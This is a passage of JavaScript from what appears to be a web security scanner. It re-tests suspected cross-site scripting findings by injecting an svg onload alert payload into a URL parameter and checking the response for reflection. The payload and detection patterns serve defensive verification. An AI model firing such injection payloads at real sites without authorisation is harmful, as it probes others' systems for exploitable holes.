  maxTests = 14,
  identityCtrl = null,
}) {
  const out = [];
  const tried = new Set();
  let count = 0;
  for (const f of findings) {
    if (f.type !== 'xss') continue;
    if (f.verification?.classification !== 'probable') continue;
    const urlStr = f.verification?.evidence?.url || f.url;
    if (!urlStr || typeof urlStr !== 'string') continue;
    if (tried.has(urlStr)) continue;
    tried.add(urlStr);
    if (count >= maxTests) break;
    let u;
    try {
      u = new URL(urlStr);
    } catch {
      continue;
    }
    const params = [...u.searchParams.keys()];
    if (!params.length) continue;
    const p = params[0];
    const payload = String.raw`"><svg/onload=alert(1)>`;
    const x = new URL(u.href);
    x.searchParams.set(p, payload);
    try {
      const r = await fetchText(x.href, { auth, modules, identityCtrl });
      const raw = r.text.includes(payload);
      const loose = /onload\s*=\s*alert/i.test(r.text) && /<svg/i.test(r.text);
      const classification = raw ? 'confirmed' : loose ? 'probable' : 'noisy';
      const score = classification === 'confirmed' ? 97 : classification === 'probable' ? 82 : 32;
      pushVerificationFinding(
        out,
        'xss',
        classification,
        score,
        `Micro-exploit XSS ${classification.toUpperCase()} @ ${x.pathname} ?${p}= (variante svg)`,
        `verify=micro_xss • param=${p} • variant=svg_onload • confidence=${classification}`,
        {
          source: 'micro-exploit-xss',
          url: x.href,
          method: 'GET',
          status: r.status,
          requestSnippet: `${x.pathname}?${p}=…`,
          responseSnippet: sampleSnippet(r.text, 'svg'),
          timestamp: nowIso(),
        },
        r.text,
      );
      count++;
    } catch {
      /* ignore */
    }
  }
  if (out.length && typeof log === 'function') {
    log(`Micro-exploit: ${out.length} teste(s) de variante XSS após verify`, 'info');
  }
  return out;
}
